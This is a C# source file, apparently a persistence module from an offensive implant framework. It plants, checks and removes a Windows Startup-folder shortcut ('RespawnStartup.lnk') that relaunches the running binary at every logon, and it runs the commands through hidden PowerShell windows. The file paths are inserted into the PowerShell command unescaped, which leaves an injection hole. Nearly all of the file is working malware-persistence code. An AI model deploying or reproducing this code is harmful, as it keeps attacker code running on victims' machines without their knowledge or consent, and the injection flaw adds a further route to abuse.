using System;
using System.IO;
using System.Diagnostics;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string DefaultShortcutName = "RespawnStartup.lnk";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Install Command Parameters:\n" +
                   $"    R2 startup Install \"{DefaultShortcutName}\" \"user\" \"{defaultPayload}\"\n" +
                   $"    (Target folders: 'user' [%APPDATA%], 'system' [%PROGRAMDATA%])";
        }

        public static string Install(string[] args)
        {
            string shortcutName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultShortcutName;

            string folderTarget = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "user";

            string payloadPath = (args != null && args.Length > 2 && !string.IsNullOrWhiteSpace(args[2]))
                ? args[2]
                : GetDefaultPayloadPath();

            try
            {
                string folderPath = StartupFolders.GetPathById(folderTarget);
                if (string.IsNullOrEmpty(folderPath))
                    return $"[-] Unknown or unmappable folder target designation: '{folderTarget}'";

                if (!Directory.Exists(folderPath))
                    Directory.CreateDirectory(folderPath);

                string lnkName = shortcutName.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase) 
                    ? shortcutName 
                    : shortcutName + ".lnk";
                string targetLnkPath = Path.Combine(folderPath, lnkName);

                if (File.Exists(targetLnkPath))
                    return $"[*] Startup shortcut '{lnkName}' already exists at: '{targetLnkPath}'";

                CreateShortcut(targetLnkPath, payloadPath);

                return $"[+] Successfully deployed startup persistence shortcut in '{folderTarget.ToUpper()}' -> '{targetLnkPath}' (Target: '{payloadPath}')";
            }
            catch (UnauthorizedAccessException)
            {
                return $"[-] Access denied. Writing to '{folderTarget}' startup directory requires elevated privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during startup installation: {ex.Message}";
            }
        }

        public static string Remove(string[] args)
        {
            string shortcutName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultShortcutName;

            string folderTarget = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "user";

            try
            {
                string folderPath = StartupFolders.GetPathById(folderTarget);
                if (string.IsNullOrEmpty(folderPath))
                    return $"[-] Could not resolve directory path for: '{folderTarget}'";

                string lnkName = shortcutName.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase) 
                    ? shortcutName 
                    : shortcutName + ".lnk";
                string targetLnkPath = Path.Combine(folderPath, lnkName);

                if (!File.Exists(targetLnkPath))
                    return $"[*] Startup shortcut not found at: '{targetLnkPath}'";

                File.Delete(targetLnkPath);
                return $"[+] Successfully removed startup shortcut '{lnkName}' from '{folderTarget.ToUpper()}'.";
            }
            catch (UnauthorizedAccessException)
            {
                return $"[-] Access denied deleting shortcut from '{folderTarget}'.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during removal: {ex.Message}";
            }
        }

        public static string Verify(string[] args)
        {
            string shortcutName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultShortcutName;

            string folderTarget = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "user";

            try
            {
                string folderPath = StartupFolders.GetPathById(folderTarget);
                if (string.IsNullOrEmpty(folderPath))
                    return $"[-] Could not resolve directory path for: '{folderTarget}'";

                string lnkName = shortcutName.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase) 
                    ? shortcutName 
                    : shortcutName + ".lnk";
                string targetLnkPath = Path.Combine(folderPath, lnkName);

                if (!File.Exists(targetLnkPath))
                    return $"[*] Startup shortcut '{lnkName}' is NOT present at '{targetLnkPath}'.";

                string destination = GetShortcutTarget(targetLnkPath);
                return $"[+] Verified Startup Shortcut in '{folderTarget.ToUpper()}' | Path: '{targetLnkPath}' | Target Binary: '{destination}'";
            }
            catch (Exception ex)
            {
                return $"[-] Error during verification: {ex.Message}";
            }
        }

        // ─── Shortcut Management Helper ──────────────────────────────────────────

        private static void CreateShortcut(string lnkPath, string targetPath)
        {
            string script = $"$sh = New-Object -ComObject WScript.Shell; $link = $sh.CreateShortcut('{lnkPath}'); $link.TargetPath = '{targetPath}'; $link.Save()";
            RunPowerShellExpression(script);
        }

        private static string GetShortcutTarget(string lnkPath)
        {
            string script = $"$sh = New-Object -ComObject WScript.Shell; $sh.CreateShortcut('{lnkPath}').TargetPath";
            return RunPowerShellExpression(script);
        }

        private static string RunPowerShellExpression(string expression)
        {
            var psi = new ProcessStartInfo("powershell.exe", $"-NoProfile -WindowStyle Hidden -Command \"{expression}\"")
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true
            };
            using var p = Process.Start(psi);
            string output = p?.StandardOutput.ReadToEnd() ?? string.Empty;
            p?.WaitForExit();
            return output.Trim();
        }

        private static class StartupFolders
        {
            public static string GetPathById(string id)
            {
                if (string.IsNullOrEmpty(id)) return string.Empty;

                return id.ToLower() switch
                {
                    "user"   => Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    "system" => Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup),
                    _        => string.Empty
                };
            }
        }
    }
}